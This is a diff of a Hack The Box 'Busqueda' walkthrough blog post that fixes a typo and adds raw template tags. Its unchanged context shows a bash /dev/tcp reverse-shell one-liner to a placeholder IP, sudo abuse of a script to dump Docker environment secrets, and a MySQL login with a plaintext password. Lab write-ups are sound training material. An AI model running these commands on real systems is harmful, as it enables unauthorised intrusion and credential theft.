@@ -104,7 +104,7 @@ No changes need to be made to the exploit code. Download the code, append the ex
 
 ![](/assets/img/posts/htb-busqueda/revshell.png)
 
-as the `svc` user. With shell as a lower priveleged user, time to enumerate the system for any privesc vectors!
+as the `svc` user. With shell as a lower privileged user, time to enumerate the system for any privesc vectors!
 
 
 ## Privilege Escalation
@@ -253,6 +253,7 @@ Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
 
 The `docker-inspect` action requires a format argument and container name.
 
+{% raw %}
 ```bash
 svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect "{{json .Config.Env}}" gitea | jq .
 [
@@ -268,7 +269,9 @@ svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-insp
   "GITEA_CUSTOM=/data/gitea"
 ]
 ```
+{% endraw %}
 
+{% raw %}
 ```bash
 svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect "{{json .Config.Env}}" mysql_db | jq .
 [
@@ -283,6 +286,7 @@ svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-insp
   "MYSQL_SHELL_VERSION=8.0.31-1.el8"
 ]
 ```
+{% endraw %}
 
 ### MySQL Access
 
@@ -386,7 +390,9 @@ A reflection of what was learned through this box.
 
 **Bash Reverse Shell**: `bash -c "bash -i >&/dev/tcp/<IP>/4444 0>&1"`
 **Connect to a MySQL server and select a database**: `mysql -h 127.0.0.1 -u root -pjI86kGUuj87guWr3RyF gitea`
+{% raw %}
 **Inspect environment variables of Docker container**: `docker-inspect "{{json .Config.Env}}" gitea`
+{% endraw %}
 
 ### Killchain Summary
 
